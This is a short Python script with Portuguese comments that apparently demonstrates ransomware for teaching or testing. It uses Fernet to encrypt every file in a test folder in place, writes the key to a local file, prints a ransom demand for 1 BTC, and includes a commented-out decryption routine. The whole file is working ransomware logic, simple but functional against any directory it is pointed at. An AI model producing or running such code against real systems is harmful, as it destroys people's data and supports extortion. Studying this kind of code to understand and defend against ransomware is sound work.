import os
from cryptography.fernet import Fernet

# --- CONFIGURAÇÃO ---
TARGET_DIR = "pasta_teste" # Crie esta pasta e coloque arquivos .txt dentro

def generate_key():
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("encryption.key", "rb").read()

def encrypt_files(key):
    f = Fernet(key)
    for file in os.listdir(TARGET_DIR):
        file_path = os.path.join(TARGET_DIR, file)
        if os.path.isfile(file_path):
            with open(file_path, "rb") as original_file:
                data = original_file.read()
            encrypted_data = f.encrypt(data)
            with open(file_path, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
    print("--- ARQUIVOS CRIPTOGRAFADOS ---")
    print("Mensagem: Seus arquivos foram sequestrados! Pague 1 BTC para recuperar.")

def decrypt_files(key):
    f = Fernet(key)
    for file in os.listdir(TARGET_DIR):
        file_path = os.path.join(TARGET_DIR, file)
        if os.path.isfile(file_path):
            with open(file_path, "rb") as encrypted_file:
                data = encrypted_file.read()
            decrypted_data = f.decrypt(data)
            with open(file_path, "wb") as decrypted_file:
                decrypted_file.write(decrypted_data)
    print("--- ARQUIVOS RECUPERADOS COM SUCESSO ---")

# Execução Simulada
# 1. Gerar Chave -> 2. Criptografar -> 3. Descriptografar (Para teste)
key = generate_key()
encrypt_files(key)
# decrypt_files(key) # Descomente para testar a recuperação
